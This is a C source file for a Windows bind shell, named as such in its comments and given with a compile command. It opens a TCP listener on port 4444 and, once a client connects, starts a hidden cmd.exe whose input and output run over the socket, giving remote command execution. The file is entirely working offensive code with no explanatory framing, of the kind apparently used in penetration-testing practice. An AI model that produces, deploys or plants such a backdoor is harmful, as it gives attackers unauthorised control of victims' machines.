// https://docs.microsoft.com/en-us/windows/desktop/winsock/getting-started-with-winsock
// i686-w64-mingw32-gcc win32_basic_single_thread_tcp_bindshell.c -l ws2_32 

#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif

#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <iphlpapi.h>
#include <stdio.h>

#pragma comment(lib, "Ws2_32.lib")
#define DEFAULT_PORT "4444"
#define DEFAULT_BUFLEN 512

int main() {
  WSADATA wsaData;
  struct addrinfo *result = NULL, *ptr = NULL, hints;
  SOCKET ListenSocket = INVALID_SOCKET;
  SOCKET ClientSocket = INVALID_SOCKET;
  char recvbuf[DEFAULT_BUFLEN];
  int iResult, iSendResult;
  int recvbuflen = DEFAULT_BUFLEN;

 
  // Initialize Winsock
  iResult = WSAStartup(MAKEWORD(2,2), &wsaData);

  // Resolve the local address and port to be used by the server
  iResult = getaddrinfo(NULL, DEFAULT_PORT, NULL, &result);
  ListenSocket = socket(result->ai_family, result->ai_socktype, result->ai_protocol);

  // Setup the TCP listening socket
  iResult = bind( ListenSocket, result->ai_addr, (int)result->ai_addrlen);

  freeaddrinfo(result);

  listen( ListenSocket, SOMAXCONN );

  // Accept a client socket
  ClientSocket = accept(ListenSocket, NULL, NULL);

  STARTUPINFO si;
  memset( &si, 0, sizeof( si ) );
  si.cb = sizeof( si );
  si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
  si.wShowWindow = SW_HIDE;

  si.hStdInput = (HANDLE)ClientSocket;
  si.hStdOutput = (HANDLE)ClientSocket;
  si.hStdError = (HANDLE)ClientSocket;

  PROCESS_INFORMATION pi;

  TCHAR cmd[] = TEXT("C:\\Windows\\System32\\cmd.exe");

  if (CreateProcess(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
    printf("create process successfully\n");
    DWORD i = WaitForSingleObject( pi.hProcess, INFINITE );
    printf("%8x\n", i);
  }


  CloseHandle( pi.hProcess );
  CloseHandle( pi.hThread );  // cleanup
  closesocket(ClientSocket);
  WSACleanup();
  return 0;
}

